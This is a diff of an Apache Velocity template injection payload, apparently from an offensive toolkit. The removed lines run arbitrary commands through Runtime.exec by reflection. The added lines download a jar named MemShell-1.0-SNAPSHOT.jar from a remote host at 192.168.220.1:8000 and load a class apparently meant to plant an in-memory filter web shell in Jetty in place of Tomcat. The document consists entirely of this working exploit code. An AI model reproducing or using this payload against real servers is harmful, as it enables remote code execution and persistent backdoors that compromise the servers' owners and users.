@@ -1,13 +1,5 @@
-#set ($e="exp")
-#set ($a=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($cmd))
-#set ($input=$e.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))
-#set($sc = $e.getClass().forName("java.util.Scanner"))
-#set($constructor = $sc.getDeclaredConstructor($e.getClass().forName("java.io.InputStream")))
-#set($scan=$constructor.newInstance($input).useDelimiter("\\A"))
-#if($scan.hasNext())
-    $scan.next()
-#end
 #set($x='')
+#set($urljar = 'http://192.168.220.1:8000/MemShell-1.0-SNAPSHOT.jar')
 #set($url0=$x.class.forName('java.net.URLClassLoader'))
 #set($con=$x.class.forName('java.lang.reflect.Constructor'))
 #set($url1=$x.class.forName('[Ljava.net.URL;'))
@@ -26,6 +18,6 @@ $array.set($urlArray,0,$url222)
 $array.set($objArray,0,$urlArray)
 #set($urlclassloader=$url00.newInstance($objArray))
 #set($loadClass=$url0.getMethod('loadClass',$x.class.forName('java.lang.String')))
-#set($obj=$loadClass.invoke($urlclassloader,'Inject.TomcatInjectFilterShell').newInstance())
+#set($obj=$loadClass.invoke($urlclassloader,'Inject.JettyInjectFilterShell').newInstance())
 #end
 #end
